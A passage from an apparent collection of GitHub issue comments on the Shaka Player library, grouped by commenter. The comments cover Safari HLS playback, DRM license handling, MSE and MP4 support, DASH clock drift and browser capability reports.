a known issue with HLS playback on Safari ( Un-ecrypted ) ?\n. Hey Guys , \nPlease let me know if I have to open this as new separate issue, I will be happy to do that , but I feel Shaka is having a hard time to play most of the HLS stream on Safari browser. Interestingly it works in Chrome. I have tested with couple of other players out there and they can play back the stream well.\nAlso, I assume this has a master play list \nhttps://akamai-axtest.akamaized.net/routes/lapd-v1-acceptance/www_c4/Manifest.m3u8\nIs there anything I am missing out or do we have a known issue with HLS playback on Safari ( Un-ecrypted ) ?\n. @TheModMaker Thanks for your quick response , I have done exactly the same as you explained , but I am gonna try it once more and will be sending you and email . Thanks again .. @TheModMaker \nHey , I went down the path your recommended how we have it the hosted demo page and all the errors are gone now. I was able to get the playback fine on Chrome and Firefox , unfortunately I am still having trouble in safari , no exceptions in console , but really unable to pull down chunks and playback. \nI am still working on getting you a build or a URL for you to test it out.. @ismena Thank you for your inputs , I agree with you it must be Safari acting weird. \n@TheModMaker I have sent an email to the email id you mentioned above. Please take a look when you get a chance.\n@joeyparrish  Thank you , i tried configuring with jumpeLargegaps, unfortunately that did't help me. Assuming it's the Safari being rigid. \nOnce again , thank you all.. @joeyparrish Thank you for taking your precious time to dig into this, that make sense. Let me give it a try with your suggestions . Thank you. \nI was on vacation , hence couldn't reply promptly .. ",
    "mrlika": "Just tested videojs with videojs-contrib-hls plugin (that AFAIK also uses mux.js) can play the stream:\nhttps://jsfiddle.net/2h4Lmtv8/1/\nand hls.js example: https://video-dev.github.io/hls.js/demo/?src=%2F%2Fwowza.peer5.com%2Fvod%2Fmp4%3Aavengers.mp4%2Fplaylist.m3u8&enableStreaming=true&autoRecoverError=true&enableWorker=true&dumpfMP4=false&levelCapping=-1&defaultAudioCodec=undefined. Thanks for pointing to getManifest method. I will prepare pull request soon.. I add the fields like:\n/**\n * The offset from the start of the resource to the\n * end of the segment, inclusive. null indicates that the segment extends\n * to the end of the resource.\n *\n * @type {?number}\n * @export\n */\nshaka.media.SegmentReference.prototype.endByte = 0;\nIt compiles, no errors or warnings, documentation looks also Ok but names are still shortened inside constructor call. I can not find annotation to prevent this behavior.. I signed it!. Also typo should be fixed in description of timelineregionexit event shakaExtern.TimelineregionInfo => shakaExtern.TimelineRegionInfo:\n/**\n * @event shaka.Player.TimelineRegionExit\n * @description Fired when the playhead exits a timeline region.\n * @property {string} type\n *   'timelineregionexit'\n * @property {shakaExtern.TimelineregionInfo} detail\n *   An object which contains a description of the region.\n * @exportDoc\n */. Yes, I can. Should the typo be fixed in this pull request or in a new one?\n. > For the first issue, why does it matter which Player instance initiated the request? The idea is that a scheme plugin is a generic way of requesting some data, so it doesn't matter what requested it.\nThe requested segment is added to the download queue. The queue is bound to P2P engine instance that is bound to Shaka Player instance. It matters in this case.\n. > We could make instance information available to the scheme plugin.\nThis is how we pass instance information to scheme plugin. It will be good if this approach keeps working in future versions of Shaka Player.\n```TypeScript\nplayer.getNetworkingEngine().registerRequestFilter((requestType: number, request: any) => {\n    request.p2pml = {player, segmentManager};\n});\n// Scheme plugin\nfunction processNetworkRequest(uri: string, request: any, requestType: number) {\n    if (!request.p2pml || requestType !== shaka.net.NetworkingEngine.RequestType.SEGMENT) {\n        return shaka.net.HttpXHRPlugin(uri, request, requestType);\n    }\n    ....\n}\n```\n\nBut the purpose of the scheme plugins is to fetch a particular type of URL. That should be independent of instance.\n\nThe problem is that all Shaka Player instances depend on one globaly set scheme plugin. But what if I want to have few players on one page. One with enabled P2P and P2P scheme plugin and another with default configuration and default scheme plugin.\n\nwe can structure the URLs to encode the stream ID and segment number\n\nOur goal is to do P2P sharing of arbitrary given by a user MPEG-DASH and HLS streams with minimal configuration. That is why approach you described doesn't work for us.\n\nThis is not true. It is perhaps poorly documented, but a scheme plugin can fill in the timeMs field of the Response object, and that value will be used for bandwidth estimation.\n\nThis is what we need. Probably we missed timeMs field in documentation. I will try to use it.. Thanks for the info. timeMs field works as expected.. ",
    "pcruiksh": "Just want to follow up on automating the use of application plugins. The basic idea right now is to add scripts that would support registering and launching of a plugin from the command line, something along the lines of:\npython plugin.py register sample_plugin http://some.cdn.com/sample_plugin.js\npython plugin.py launch sample_plugin\nWhich would start a local server and launch the demo app with a URL param corresponding to the target plugin, so the application could load the correct plugin script to be registered against this interface.\nMy main concern is whether this feels overly complicated or too heavy handed for what essentially boils down to adding another script to the page? The benefit is it avoids changes to the UI (i.e. adding a list of available plugins which a user has to maintain), and allows rapid integration with any number of provided plugins with no code changes required. \nAny feedback would be appreciated!. I've opened a new PR for this issue (#1374), it's still a WIP but it should demonstrate the direction we were hoping to take.. I can confirm upgrading to recent webcomponents v1.2.0 resolves the failing instanceof checks. Sounds good @joeyparrish I'll do that. ",
    "mstattma": "@joeyparrish Do you have any hints on how fps.2_0 licenses look like? How are you testing this license server wise?\niOS does support MSE or EME meanwhile btw: https://castlabs.com/news/safari-on-ios-now-supports-fairplay-streaming-drm/ I have no idea if that's true for fps.2_0 though (to get to MSE+EME).. Alright, curious to learn if any shareable information surfaces. \nYou're right about mobile Safari, sorry for my confusion. I initially thought Apple aligned MSE/EME with regular Safari, but it seems they've just added their proprietary EME for fps.1_0 to non-MSE playback.. Or you could use Electron with persistent Widevine licenses, a project which we develop in cooperation with Google/Widevine: https://github.com/castlabs/electron-releases. With Electron it's possible to serve local video files via node.js to Shaka running on an embedded Chromium. There is also a downloader for DASH content, but it seem you won't need that: https://github.com/castlabs/downstream_electron. You find the offline server part here: https://github.com/castlabs/downstream_electron/blob/master/api/server/server.js\nHowever, as @TheModMaker pointed out, you need to be at least online once to do the license acquisition. Depending on the use case you could periodically update keys or pre-fetch future KIDs, or even reuse KIDs across content updates.. Not really a workaround, but as an alternative solution approach if possible for the use case: Electron provides better ways of managing downloaded content as it provides direct file system access. \nShaka can still be used for playback. Here is an Electron DASH + MSS downloader library with an example using Shaka: \nhttps://github.com/castlabs/downstream_electron. ",
    "lucasdavila86": "I'm experiencing the same issue, under the same test conditions (custom app, demo app, chrome on W10 adding chrome on Ubuntu 16.04)\nI've noticed that the manifest failing looks like this:\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<MPD xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" type=\"dynamic\" xsi:schemaLocation=\"urn:mpeg:dash:schema:mpd:2011 http://standards.iso.org/ittf/PubliclyAvailableStandards/MPEG-DASH_schema_files/DASH-MPD.xsd\" maxSegmentDuration=\"PT4S\" minBufferTime=\"PT4S\" profiles=\"urn:mpeg:dash:profile:isoff-live:2011\" availabilityStartTime=\"2014-01-01T00:00:15\" publishTime=\"2014-01-01T00:00:15\" minimumUpdatePeriod=\"PT4S\" timeShiftBufferDepth=\"PT40S\" xmlns=\"urn:mpeg:dash:schema:mpd:2011\">\n  <Period start=\"PT0.0S\" id=\"1\">\n    <AdaptationSet mimeType=\"video/mp4\" minBandwidth=\"1500000\" maxBandwidth=\"6000000\" segmentAlignment=\"true\" startWithSAP=\"1\">\n      <ContentComponent id=\"1\" contentType=\"video\" />\n      <SegmentTemplate initialization=\"Video$RepresentationID$.mp4\" media=\"Video$RepresentationID$-$Number$.mp4\" duration=\"4\" startNumber=\"1\" />\n      <Representation id=\"0\" bandwidth=\"6000000\" codecs=\"avc1.4d401e\" />\n      <Representation id=\"1\" bandwidth=\"1500000\" codecs=\"avc1.4d401e\" />\n    </AdaptationSet>\n    <AdaptationSet mimeType=\"audio/mp4\" minBandwidth=\"64000\" maxBandwidth=\"64000\" segmentAlignment=\"true\" startWithSAP=\"1\">\n      <ContentComponent id=\"1\" contentType=\"audio\" />\n      <SegmentTemplate initialization=\"Audio$RepresentationID$.mp4\" media=\"Audio$RepresentationID$-$Number$.mp4\" duration=\"4\" startNumber=\"1\" />\n      <Representation id=\"2\" bandwidth=\"64000\" codecs=\"mp4a.40.5\" />\n    </AdaptationSet>\n  </Period>\n</MPD>. ",
    "SunshineJunFu": "Yep. for example, I divdie  a 1920x1080 video into 4 480x270 video using mp4box and then I aggregate the first and second 480x270 into a 960x540 video. This is also called SRD in mpeg dash protocol. . Thanks  a lot!. ",
    "cromefire": "I currently have some minor issues with my application, but it seems to be working.\nHow about registering it by default? . If anyone tells me, where the registering happens, I can do a PR.. ",
    "barinbritva": "Still doesn't work for me.. ",
    "Moiahbabi": "I was able to store/read/delete offline content once I deleted the old database. however, I just want to note that reading/deleting data from old databases (in my case v2.2.7) worked just fine, but adding new content to the old db was not possible due to this error. this was tested on my custom app.\nthanks.. ",
    "stroemlund": "We have a problem where shaka 2.3.1 want start playing our streams however dashif, bitmovin and older shaka versions starts playing the mpeg dash streams immediately Shaka keeps saying there is an issue with the time of the segments however all other players are playing back our streams just fine. Could these issues be related? I can provide a test url for any of the devs if wanted. Just can't post it public.. Doesn\u2019t work for me. My stream still shows the same problems as before.\nJacob\n\nOn 1 Feb 2018, at 16.51, Joey Parrish notifications@github.com wrote:\nThis should be working now in the nightly build: https://nightly-dot-shaka-player-demo.appspot.com/demo/\nCan someone please confirm?\n\u2014\nYou are receiving this because you commented.\nReply to this email directly, view it on GitHub, or mute the thread.\n. https://dmpe12-4dash.akamaized.net/dash/live/594304/DPME12-4/index.mpd\nOn 1 Feb 2018, at 18.16, Jacob Trimble notifications@github.com wrote:\n@stroemlund Can you give us a manifest URL?\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub, or mute the thread.\n. Sure makes sense! Well we are running elemental encoders according to standards and we see no reason for it to drift as this is a problem even at the very first segment of the stream. So it doesn\u2019t happen over time but immediately from the start.\nOn 1 Feb 2018, at 18.58, Jacob Trimble notifications@github.com wrote:\nClosed #1232.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub, or mute the thread.\n. So 2.3.3 the drift fix should be included?\nOn 1 Feb 2018, at 22.23, Joey Parrish notifications@github.com wrote:\nCherry-picked for v2.3.3. The correctness of the fix was still being debated while I was preparing v2.3.2. Sorry for any inconvenience caused by delaying this fix for one more release.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub, or mute the thread.\n. Just funny the streams are playing in 2.2.x\nOn 2 Feb 2018, at 19.55, Jacob Trimble notifications@github.com wrote:\nNo, we are still working on fixes for drift, which you can fallow in #999. The fix for SegmentTemplate with duration will appear in 2.3.3.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub, or mute the thread.\n. The clock is spot on. And how can the same encoder set different time on segments and manifest start?\nOn 2 Feb 2018, at 20.17, Joey Parrish notifications@github.com wrote:\nReferring to the analysis above in #1232 (comment), if the segment times are in the future, it sounds like it's not drift, but rather a clock sync or encoder clock issue. Is the clock on your encoder correct? Do you have clock sync set up on the content?\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub, or mute the thread.\n. Yes plenty of times. And they simply refers to the stream working in every other players except shaka due to shaka handling the timestamps differently.\nOn 12 Feb 2018, at 19.46, Joey Parrish notifications@github.com wrote:\nI don't know, but it could be a bug in the Elemental encoder. Have you talked to Elemental support?\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub, or mute the thread.\n. \n",
    "DanielMartine": "I can't understand how to customise UI controls. Thanks so much @joeyparrish your thread is the perfect starting point!. ",
    "dean-river": "thanks for your answer.  Fabricate H.264-encoded black frames is very difficult for me. \nBecause my manifest is all static (vod), and the duration difference is not very big . so I tried two easy way to cover this situation\uff0cbut no one is perfect.\nfirst one \uff1a\n       I remove the video SourceBuffer when i find it have playback all the buffered data. then the MediaSource can play the leftover audio.  But the downside is i need do a little seek forward AND we   i seek back to the video duration,   it can only play audio (because i have removed the video SourceBuffer).\nsecond one:\n      When I found the video data cache is done\uff0c I will cached all the audio data as soon as possible and do not care how much audio data i have cached.  when cached all the audio data, then fire  the EndStream event of the MediaSource,  it can play the leftover audio.   But the downside is if the difference is very big. i need to cache many many audio data\u3002\nI know this two method is not beautiful.  but if shaka can use a hacker way  like I said above to bypass this problems that will make shaka more  adaptability\uff0cDo you have any suggestions to fix\n the downside of the two methods above or if you have a better way to bypass the problem? \nFinally, thank you for your reply.. hi\ni have another question like this\uff0c if a manifest which have more than two period. If some have video and audio, and some only have video or audio. shaka can not playback this too . Should shaka support these manifest?. yes ! thanks all you replys.. ",
    "saisasanksunkavalli": "These are the results If i load the support page in XWalk \nMozilla/5.0 (Linux; Android 7.0; SM-G615FU Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Crosswalk/23.53.589.4 Mobile Safari/537.36v2.3.1-dirty\njs\n{\n  \"manifest\": {\n    \"application/dash+xml\": true,\n    \"application/x-mpegurl\": true,\n    \"application/vnd.apple.mpegurl\": true,\n    \"application/x-offline-manifest\": true,\n    \"mpd\": true,\n    \"m3u8\": true,\n    \"application/vnd.ms-sstr+xml\": false,\n    \"ism\": false\n  },\n  \"media\": {\n    \"video/mp4; codecs=\\\"avc1.42E01E\\\"\": true,\n    \"video/mp4\": true,\n    \"video/mp4; codecs=\\\"avc3.42E01E\\\"\": true,\n    \"video/mp4; codecs=\\\"hev1.1.6.L93.90\\\"\": false,\n    \"video/mp4; codecs=\\\"hvc1.1.6.L93.90\\\"\": false,\n    \"video/mp4; codecs=\\\"hev1.2.4.L153.B0\\\"; eotf=\\\"smpte2084\\\"\": false,\n    \"video/mp4; codecs=\\\"hvc1.2.4.L153.B0\\\"; eotf=\\\"smpte2084\\\"\": false,\n    \"video/mp4; codecs=\\\"vp9\\\"\": false,\n    \"video/mp4; codecs=\\\"vp09.00.10.08\\\"\": false,\n    \"audio/mp4; codecs=\\\"mp4a.40.2\\\"\": true,\n    \"audio/mp4\": true,\n    \"audio/mp4; codecs=\\\"ac-3\\\"\": false,\n    \"audio/mp4; codecs=\\\"ec-3\\\"\": false,\n    \"audio/mp4; codecs=\\\"opus\\\"\": false,\n    \"audio/mp4; codecs=\\\"flac\\\"\": false,\n    \"video/webm; codecs=\\\"vp8\\\"\": false,\n    \"video/webm\": true,\n    \"video/webm; codecs=\\\"vp9\\\"\": true,\n    \"video/webm; codecs=\\\"av1\\\"\": false,\n    \"audio/webm; codecs=\\\"vorbis\\\"\": true,\n    \"audio/webm\": true,\n    \"audio/webm; codecs=\\\"opus\\\"\": true,\n    \"video/mp2t; codecs=\\\"avc1.42E01E\\\"\": false,\n    \"video/mp2t\": false,\n    \"video/mp2t; codecs=\\\"avc3.42E01E\\\"\": false,\n    \"video/mp2t; codecs=\\\"hvc1.1.6.L93.90\\\"\": false,\n    \"video/mp2t; codecs=\\\"mp4a.40.2\\\"\": false,\n    \"video/mp2t; codecs=\\\"ac-3\\\"\": false,\n    \"video/mp2t; codecs=\\\"ec-3\\\"\": false,\n    \"text/vtt\": true,\n    \"application/mp4; codecs=\\\"wvtt\\\"\": true,\n    \"application/mp4\": true,\n    \"application/ttml+xml\": true,\n    \"application/mp4; codecs=\\\"stpp\\\"\": true\n  },\n  \"drm\": {\n    \"org.w3.clearkey\": {\n      \"persistentState\": false\n    },\n    \"com.microsoft.playready\": null,\n    \"com.apple.fps.2_0\": null,\n    \"com.apple.fps.1_0\": null,\n    \"com.apple.fps\": null,\n    \"com.adobe.primetime\": null,\n    \"com.widevine.alpha\": {\n      \"persistentState\": false\n    }\n  },\n  \"offline\": true\n}\nWhat does these results infer ? . These are the results if I load the support page in Android WebView \nMozilla/5.0 (Linux; Android 7.0; SM-G615FU Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36 v2.3.1-dirty \njs\n{\n  \"manifest\": {\n    \"application/dash+xml\": true,\n    \"application/x-mpegurl\": true,\n    \"application/vnd.apple.mpegurl\": true,\n    \"application/x-offline-manifest\": true,\n    \"mpd\": true,\n    \"m3u8\": true,\n    \"application/vnd.ms-sstr+xml\": false,\n    \"ism\": false\n  },\n  \"media\": {\n    \"video/mp4; codecs=\\\"avc1.42E01E\\\"\": true,\n    \"video/mp4\": true,\n    \"video/mp4; codecs=\\\"avc3.42E01E\\\"\": true,\n    \"video/mp4; codecs=\\\"hev1.1.6.L93.90\\\"\": false,\n    \"video/mp4; codecs=\\\"hvc1.1.6.L93.90\\\"\": false,\n    \"video/mp4; codecs=\\\"hev1.2.4.L153.B0\\\"; eotf=\\\"smpte2084\\\"\": false,\n    \"video/mp4; codecs=\\\"hvc1.2.4.L153.B0\\\"; eotf=\\\"smpte2084\\\"\": false,\n    \"video/mp4; codecs=\\\"vp9\\\"\": false,\n    \"video/mp4; codecs=\\\"vp09.00.10.08\\\"\": true,\n    \"audio/mp4; codecs=\\\"mp4a.40.2\\\"\": true,\n    \"audio/mp4\": true,\n    \"audio/mp4; codecs=\\\"ac-3\\\"\": false,\n    \"audio/mp4; codecs=\\\"ec-3\\\"\": false,\n    \"audio/mp4; codecs=\\\"opus\\\"\": false,\n    \"audio/mp4; codecs=\\\"flac\\\"\": true,\n    \"video/webm; codecs=\\\"vp8\\\"\": true,\n    \"video/webm\": true,\n    \"video/webm; codecs=\\\"vp9\\\"\": true,\n    \"video/webm; codecs=\\\"av1\\\"\": false,\n    \"audio/webm; codecs=\\\"vorbis\\\"\": true,\n    \"audio/webm\": true,\n    \"audio/webm; codecs=\\\"opus\\\"\": true,\n    \"video/mp2t; codecs=\\\"avc1.42E01E\\\"\": false,\n    \"video/mp2t\": false,\n    \"video/mp2t; codecs=\\\"avc3.42E01E\\\"\": false,\n    \"video/mp2t; codecs=\\\"hvc1.1.6.L93.90\\\"\": false,\n    \"video/mp2t; codecs=\\\"mp4a.40.2\\\"\": false,\n    \"video/mp2t; codecs=\\\"ac-3\\\"\": false,\n    \"video/mp2t; codecs=\\\"ec-3\\\"\": false,\n    \"text/vtt\": true,\n    \"application/mp4; codecs=\\\"wvtt\\\"\": true,\n    \"application/mp4\": true,\n    \"application/ttml+xml\": true,\n    \"application/mp4; codecs=\\\"stpp\\\"\": true\n  },\n  \"drm\": {\n    \"org.w3.clearkey\": {\n      \"persistentState\": false\n    },\n    \"com.microsoft.playready\": null,\n    \"com.apple.fps.2_0\": null,\n    \"com.apple.fps.1_0\": null,\n    \"com.apple.fps\": null,\n    \"com.adobe.primetime\": null,\n    \"com.widevine.alpha\": null\n  },\n  \"offline\": true\n}\n@joeyparrish  with these Results, can you tell me If persistent licenses are supported on XWalk ? . @joeyparrish  Thanks for your comment . I have one more doubt. I have loaded the support page in my mobile's Google Chrome App , Below pasted ones are the results.\nMozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36 v2.3.1-dirty \njs\n{\n  \"manifest\": {\n    \"application/dash+xml\": true,\n    \"application/x-mpegurl\": true,\n    \"application/vnd.apple.mpegurl\": true,\n    \"application/x-offline-manifest\": true,\n    \"mpd\": true,\n    \"m3u8\": true,\n    \"application/vnd.ms-sstr+xml\": false,\n    \"ism\": false\n  },\n  \"media\": {\n    \"video/mp4; codecs=\\\"avc1.42E01E\\\"\": true,\n    \"video/mp4\": true,\n    \"video/mp4; codecs=\\\"avc3.42E01E\\\"\": true,\n    \"video/mp4; codecs=\\\"hev1.1.6.L93.90\\\"\": false,\n    \"video/mp4; codecs=\\\"hvc1.1.6.L93.90\\\"\": false,\n    \"video/mp4; codecs=\\\"hev1.2.4.L153.B0\\\"; eotf=\\\"smpte2084\\\"\": false,\n    \"video/mp4; codecs=\\\"hvc1.2.4.L153.B0\\\"; eotf=\\\"smpte2084\\\"\": false,\n    \"video/mp4; codecs=\\\"vp9\\\"\": false,\n    \"video/mp4; codecs=\\\"vp09.00.10.08\\\"\": true,\n    \"audio/mp4; codecs=\\\"mp4a.40.2\\\"\": true,\n    \"audio/mp4\": true,\n    \"audio/mp4; codecs=\\\"ac-3\\\"\": false,\n    \"audio/mp4; codecs=\\\"ec-3\\\"\": false,\n    \"audio/mp4; codecs=\\\"opus\\\"\": false,\n    \"audio/mp4; codecs=\\\"flac\\\"\": true,\n    \"video/webm; codecs=\\\"vp8\\\"\": true,\n    \"video/webm\": true,\n    \"video/webm; codecs=\\\"vp9\\\"\": true,\n    \"video/webm; codecs=\\\"av1\\\"\": false,\n    \"audio/webm; codecs=\\\"vorbis\\\"\": true,\n    \"audio/webm\": true,\n    \"audio/webm; codecs=\\\"opus\\\"\": true,\n    \"video/mp2t; codecs=\\\"avc1.42E01E\\\"\": false,\n    \"video/mp2t\": false,\n    \"video/mp2t; codecs=\\\"avc3.42E01E\\\"\": false,\n    \"video/mp2t; codecs=\\\"hvc1.1.6.L93.90\\\"\": false,\n    \"video/mp2t; codecs=\\\"mp4a.40.2\\\"\": false,\n    \"video/mp2t; codecs=\\\"ac-3\\\"\": false,\n    \"video/mp2t; codecs=\\\"ec-3\\\"\": false,\n    \"text/vtt\": true,\n    \"application/mp4; codecs=\\\"wvtt\\\"\": true,\n    \"application/mp4\": true,\n    \"application/ttml+xml\": true,\n    \"application/mp4; codecs=\\\"stpp\\\"\": true\n  },\n  \"drm\": {\n    \"org.w3.clearkey\": {\n      \"persistentState\": false\n    },\n    \"com.microsoft.playready\": null,\n    \"com.apple.fps.2_0\": null,\n    \"com.apple.fps.1_0\": null,\n    \"com.apple.fps\": null,\n    \"com.adobe.primetime\": null,\n    \"com.widevine.alpha\": {\n      \"persistentState\": true\n    }\n  },\n  \"offline\": true\n}\nIf you can observe from the results , persistent licenses are supported on Google Chrome App\n\n\"com.widevine.alpha\": {\n      \"persistentState\": true\n    }\n\nBut If i load the Offline Support example , it is still giving 6001 error. What might be the issue in this case ?. ",
    "nallown": "Ah I see, is it not possible to add support for MP4 playback with the QoE stats and buffer control then? Because I love the Shaka Player API and a lot of things it offers. I don't mind if a lot of things become unusable but QoE monitoring and buffer control. I would love to have QoE and buffer control.\nAlso most tutorials and articles about MSE that I've read use MP4 files as examples, MSE only works with MP4 files if they have the \"moov\" atom up the front since the \"moov\" atom is what gives the control over seeking in the videos using the \"Range\" or \"Bytes\" header.\nMost MP4 files should have the \"moov\" atom up the front though if they're made for web playback since otherwise you would pretty much not be able to seek the video. So majority of MP4 files should be playable using MSE. \nYou can play all MP4 files with MSE but not all would be seekable but I think that those MP4 files wouldn't be seekable in the HTML5 player anyway because its missing the \"moov\" atom that gives it seek support. . That's really disappointing. I was hoping I could maybe use Shaka Player to play my videos in. You and the team seem to know what you're doing when it comes down to building video players that relies on custom networking so I wanted to add your guys player to my web stack, it would of made it so much better.\nMaybe one day I'll have the resources to stream videos using HLS and DASH but for now I'll guess I'll just learn how to use my own implementation of MSE.\nThank you for responding to my messages, it honestly would be great if you guys could add MP4 playback using MSE but if not then thank for responding to my messages.. I'll give it my best then and will try to learn how to work MSE, I think with your guys advise, I can really get somewhere. I'll start by creating a basic player that relies on MSE, and once I've figured out better how MSE works, and have a working product, I'll start reading your guys code and try to implement into that.. I see, I think the transmuxing process is adding the \"moov\" atom at the front of the video. At least that's what understood from skimming through articles. I think the way it works is that with non fragmented videos I just fetch the whole video rather then a partial video.\nI'll give it a try and will keep you guys posted. Hopefully the process of building a basic MP4 + MSE player will be simple, once that in place the hard part of porting that over to Shaka Player will begin.. I've done some experimenting and this is what I found out.\nMP4 files can only be played using MSE if they're fragmented (just like you said), the fragmenting process has two parts to it:\n1) Moving the \"moov\" atom to the front of the video\n2) Turning the video file into chunks by segmenting it\nPeople can stream MP4 files using the web perfectly fine without having to segment it. All they need is the \"moov\" atom at the front and it should be fine.  Most MP4 files that are played using the web should already have the \"moov\" atom at the front of the video since otherwise people wouldn't be able to seek to a specific time in the video using the web, so for most people they wouldn't have to do anything here.\nNow for the segmenting part its another story. I tried segmenting some videos and figured out that they played slower then normal MP4 videos when played through the web unless if I implemented MSE, it had a much longer startup time we're talking about a 20 second difference here. This was only in Chrome though in Firefox it was playing fine, just like a normal MP4.\nSince most MP4 videos play fine without segmenting, they shouldn't need to be segmented to be played through the web, if anything it could make things worse.\nAnother thing to note is that most encoders like \"ffmpeg\" and \"handbrakecli\" have a \"optimize for web\" option and when they enable that option, it only adds the \"moov\" atom at the front, it doesn't segment the video.\nSo I assume that most MP4 videos aren't segmented.\nBut the thing is, if a video isn't segmented then it basically isn't coded to work with MSE. MSE is made to only load video segments and not byte ranges. which is what the built in HTML5 player and any other web player that plays a MP4 file normally uses.\nSo the moral of the story is...\n\nMSE can only play MP4 files if they're fully fragmented (So if they're \"moov\"ed and \"segmented\").\nSegmented MP4 files play slower on the web unless if they're played through MSE\nSince majority of MP4 files aren't played through MSE, they're most likely not segmented\nSince majority of MP4 files aren't segmented, majority of MP4 files on the web wouldn't work with MSE\n\nAt this point, someone might as well use HLS or DASH then instead of segmented MP4 files since they're not treated as normal MP4 files. They're only better if they're played through MSE and since HLS and DASH are better options for MSE people might as well use them instead.. ",
    "DenisDashkevich": "@joeyparrish i sent message on this email shaka-player-issues@google.com\n. Hi, it works pretty well. thanks!\n2018-02-01 21:26 GMT+03:00 Jacob Trimble notifications@github.com:\n\n@DenisDashkevich https://github.com/denisdashkevich #1232\nhttps://github.com/google/shaka-player/issues/1232 has been fixed, can\nyou please retest?\nhttps://nightly-dot-shaka-player-demo.appspot.com/demo/\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/1245#issuecomment-362357418,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/ARY5fdv_YSfVgr8D-QVzYOGxH64xQnzBks5tQgHKgaJpZM4RrSIF\n.\n. @niklaskorz wow, great work, man!. hello, have you received any updates on this issue?. \n",
    "Fenny": "It answered my question, I will close it.. ",
    "jimaek": "Btw you could also use jsDelivr. It pulls files directly from npm, so no need to do anything at all. \nhttps://cdn.jsdelivr.net/npm/shaka-player/\nhttps://cdn.jsdelivr.net/npm/shaka-player\nhttps://cdn.jsdelivr.net/npm/shaka-player@2.3.1/dist/shaka-player.compiled.js. ",
    "vzTrevorHunsaker": "We do insert CORS headers in our responses and they worked swimmingly up until we found a case where we needed to send a re-direct. It appears as though it's CORS + redirects specifically that's catching us out here.\nI will try both of these suggestions to attempt to validate. Thanks!. So, I am able to successfully play this stream when I --disable-web-security and check the service workers' \"Bypass for network\" box.  Which leads me to believe this is a CORS issue, but I also am under the impression that it's a CORS issue I shouldn't be seeing, given the headers that I'm returning in my responses.\nI mean, the re-directed requests actually succeed, and deliver Widevine licenses. My question is, given that's the case, why is the browser refusing to use them? Browser bug? I'm misunderstanding something?. Ok, I've filed a report against Chromium: https://bugs.chromium.org/p/chromium/issues/detail?id=807706. ",
    "krvangala": "our customized license verification is not based on direct http call. Has to call another API (async with callback) to get license.\nto workaround for this. i have added following code in my app. it is working for me now. is there any better way to do this?\n```js\nshaka.media.DrmEngine.prototype.sendLicenseRequest_ = function(event) {\n  /* @type {!MediaKeySession} /\n  var session = event.target;\nvar activeSession;\n  for (var i = 0; i < this.activeSessions_.length; i++) {\n    if (this.activeSessions_[i].session == session) {\n      activeSession = this.activeSessions_[i];\n      break;\n    }\n  }\n  var thisPtr = this;\n  var drmType =\"widevine\";\n  if(this.currentDrmInfo_.keySystem.indexOf(\"playready\",0) != -1)\n    drmType = \"playready\";\n  custom_license_request(drmType, event.message,function (data) {\n    if (this.destroyed_) return Promise.reject();\n    // Request succeeded, now pass the response to the CDM.\n    return session.update(data).then(function()\n     {\n      var event = new shaka.util.FakeEvent('drmsessionupdate');\n      thisPtr.playerInterface_.onEvent(event);\n\n      if (activeSession) \n      {\n        if (activeSession.updatePromise)\n          activeSession.updatePromise.resolve();\n        // In case there are no key statuses, consider this session loaded\n        // after a reasonable timeout.  It should definitely not take 5\n        // seconds to process a license.\n        setTimeout(function() {\n          activeSession.loaded = true;\n          if (thisPtr.activeSessions_.every(function(s) { return s.loaded; }))\n            thisPtr.allSessionsLoaded_.resolve();\n        }.bind(this), 5000);\n\n      }\n});\n\n}.bind(this), function(error){\n   // Ignore destruction errors\n        if (this.destroyed_) return Promise.resolve();\n    var shakaErr = new shaka.util.Error(\n        shaka.util.Error.Severity.CRITICAL,\n        shaka.util.Error.Category.DRM,\n        shaka.util.Error.Code.LICENSE_REQUEST_FAILED,\n        error);\n    this.onError_(shakaErr);\n    if (activeSession && activeSession.updatePromise)\n      activeSession.updatePromise.reject(shakaErr);\n\n}.bind(this));\n}\n```\n. @joeyparrish, i am planning to write own drm scheme plugin. it will take a while to start work on that.\nmean while, i am exploring the stats provided  by shaka player.. thank you!. @TheModMaker   yes. it helped. thank you.. thanks. it helped me. . Sorry for not give enough info. Our back end creates a single file containing  sidx information for all streams. This file prefect he'd even before starting playback. Now I would like to use this pre downloaded data instead of calling http server again. This reduces the rate switching  delay. Thanks . Hi @vaage  and @chrisfillmore  thanks for reply.\nbuffer level  here means, buffer level (time ranges) in Media source (  video or audio).\nWe have deployed our player( uses Shaka 2.4.2)  on field. Would like collect  buffer levels of audio and video in Media Source.\nlooks like shaka.Player.prototype.getBufferedInfo    will serve the purpose.\nThanks\nKrishna. ",
